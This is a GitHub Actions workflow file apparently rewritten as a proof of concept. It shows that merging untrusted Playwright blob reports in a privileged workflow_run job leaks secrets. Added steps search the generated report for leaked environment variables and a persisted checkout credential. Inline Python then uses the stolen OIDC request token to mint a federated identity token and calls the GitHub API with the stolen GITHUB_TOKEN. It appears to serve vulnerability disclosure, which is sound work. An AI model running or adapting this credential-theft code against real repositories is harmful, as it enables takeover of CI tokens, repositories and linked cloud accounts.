name: Publish Test Results
on:
  workflow_run:
    workflows: ["tests others"]
    types:
      - completed

jobs:
  merge-reports:
    permissions:
      pull-requests: write
      checks: write
      id-token: write   # This is required for OIDC login (azure/login) to succeed
      contents: read    # This is required for actions/checkout to succeed
    if: ${{ github.event.workflow_run.event == 'pull_request' }}
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-node@v4
      with:
        node-version: 20
    - run: npm install playwright@1.50.0 --no-audit --no-fund
      env:
        PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD: 1

    - name: Download blob report artifact
      uses: actions/github-script@v7
      with:
        script: |
          const fs = require('fs');
          fs.mkdirSync('all-blob-reports/artifacts', { recursive: true });
          const allArtifacts = await github.paginate(github.rest.actions.listWorkflowRunArtifacts, {
            ...context.repo,
            run_id: context.payload.workflow_run.id
          });
          const artifacts = allArtifacts.filter(a => a.name.startsWith('blob-report'));
          for (const artifact of artifacts) {
            const result = await github.rest.actions.downloadArtifact({
              ...context.repo,
              artifact_id: artifact.id,
              archive_format: 'zip'
            });
            fs.writeFileSync(`all-blob-reports/artifacts/${artifact.name}.zip`, Buffer.from(result.data));
          }

    - name: Unzip artifacts
      run: |
        unzip -n 'all-blob-reports/artifacts/*.zip' -d all-blob-reports
        rm -rf 'all-blob-reports/artifacts'

    - name: Merge reports
      run: |
        npx playwright merge-reports --config .github/workflows/merge.config.ts ./all-blob-reports
      env:
        NODE_OPTIONS: --max-old-space-size=8192
        POC_SECRET_MARKER: poc-marker-value-9f3a

    - name: Inspect leaked report data (attacker-visible on Azure)
      run: |
        echo '--- data files:'
        ls -la playwright-report/data || true
        echo '--- files containing leaked env marker:'
        grep -l "poc-marker-value-9f3a" playwright-report/data/* 2>/dev/null || echo 'no leak found'
        LEAK=$(grep -l "poc-marker-value-9f3a" playwright-report/data/* 2>/dev/null | head -1)
        if [ -n "$LEAK" ]; then
          echo "ENVIRON_LEAK_FILE=$LEAK"
          tr '\0' '\n' < "$LEAK" | grep -E 'POC_SECRET_MARKER|ACTIONS_ID_TOKEN_REQUEST_URL|ACTIONS_ID_TOKEN_REQUEST_TOKEN' | sed -E 's/(ACTIONS_ID_TOKEN_REQUEST_TOKEN=).*/\1<token-present-redacted>/; s/(ACTIONS_ID_TOKEN_REQUEST_URL=).*/\1<url-present-redacted>/'
        fi
        GITCFG=$(grep -l "AUTHORIZATION: basic" playwright-report/data/* 2>/dev/null | head -1)
        echo "GIT_CONFIG_LEAK_FILE=$GITCFG"
        if [ -n "$GITCFG" ]; then
          echo 'leaked git config contains a persisted checkout credential (GITHUB_TOKEN)'
        fi

    - name: Prove stolen OIDC request token can mint a federated identity token
      run: |
        LEAK=$(grep -l "poc-marker-value-9f3a" playwright-report/data/* 2>/dev/null | head -1)
        python3 - "$LEAK" <<'PY'
        import sys, os, json, urllib.request, base64
        data = open(sys.argv[1], 'rb').read().decode('utf-8', 'replace')
        env = {}
        for kv in data.split('\0'):
            if '=' in kv:
                k, v = kv.split('=', 1)
                env[k] = v
        url = env.get('ACTIONS_ID_TOKEN_REQUEST_URL')
        tok = env.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
        print('stolen request url present:', bool(url))
        print('stolen request token present:', bool(tok))
        if url and tok:
            req = urllib.request.Request(url + '&audience=api://AzureADTokenExchange', headers={'Authorization': 'Bearer ' + tok})
            body = urllib.request.urlopen(req, timeout=20).read()
            jwt = json.loads(body)['value']
            payload = jwt.split('.')[1]
            payload += '=' * (-len(payload) % 4)
            claims = json.loads(base64.urlsafe_b64decode(payload))
            print('MINTED OIDC TOKEN CLAIMS:', json.dumps({k: claims.get(k) for k in ('aud', 'iss', 'sub', 'repository', 'ref', 'event_name')}))

        # Second leak: the GITHUB_TOKEN persisted by actions/checkout in .git/config
        import re
        cfg = ''
        for f in os.listdir('playwright-report/data'):
            p = os.path.join('playwright-report/data', f)
            try:
                body = open(p, 'rb').read().decode('utf-8', 'replace')
            except Exception:
                continue
            if 'AUTHORIZATION: basic' in body:
                cfg = body
                break
        m = re.search(r'AUTHORIZATION: basic ([A-Za-z0-9+/=]+)', cfg)
        print('leaked checkout credential present:', bool(m))
        if m:
            raw = base64.b64decode(m.group(1)).decode()
            gh_token = raw.split(':', 1)[1] if ':' in raw else raw
            req = urllib.request.Request('https://api.github.com/repos/' + os.environ['GITHUB_REPOSITORY'], headers={'Authorization': 'Bearer ' + gh_token, 'User-Agent': 'poc'})
            try:
                resp = urllib.request.urlopen(req, timeout=20)
                d = json.loads(resp.read())
                print('STOLEN GITHUB_TOKEN API STATUS:', resp.status, 'PERMISSIONS:', json.dumps(d.get('permissions')))
            except Exception as e:
                print('stolen token API call failed:', type(e).__name__)
        PY

    - name: Comment on PR
      uses: actions/github-script@v7
      with:
        github-token: ${{ secrets.GITHUB_TOKEN }}
        script: |
          const fs = require('fs');
          const prNumber = parseInt(fs.readFileSync('pull_request_number.txt').toString());
          console.log('would comment on', prNumber);

    - name: Azure Login
      uses: azure/login@v2
      with:
        client-id: fake-client-id
        tenant-id: fake-tenant-id
        subscription-id: fake-subscription-id
